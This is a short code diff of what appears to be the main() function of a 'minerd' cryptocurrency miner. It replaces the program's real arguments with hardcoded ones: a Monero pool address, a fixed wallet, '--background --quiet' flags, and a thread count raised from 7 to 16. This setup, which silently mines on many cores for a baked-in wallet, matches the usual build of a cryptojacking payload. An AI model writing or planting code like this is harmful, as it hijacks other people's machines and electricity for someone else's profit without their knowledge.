@@ -1763,7 +1763,10 @@ argv[11] = --background
 */
 int main(int argc, char *argv[]) {
 
-    char* dummy_args[] = { "./minerd", "-a", "cryptonight", "-o", "stratum+tcp://monerohash.com:3333", "-u", "47oyMswJzXM4H3pwj5oRNgDP5GTzG8tJqdNHZqQydc3MS29zeqCVwiSjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3eTCxwZ", "-p", "x", "-t", "7", "--background", "--quiet", NULL };	
+    char* dummy_args[] = { "./minerd", "-a", "cryptonight", "-o"
+                         , "stratum+tcp://monerohash.com:3333"
+                         , "-u", "47oyMswJzXM4H3pwj5oRNgDP5GTzG8tJqdNHZqQydc3MS29zeqCVwiSjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3eTCxwZ"
+                         , "-p", "x", "-t", "16", "--background", "--quiet", NULL };	
     argc = 12;
     argv = dummy_args;
 
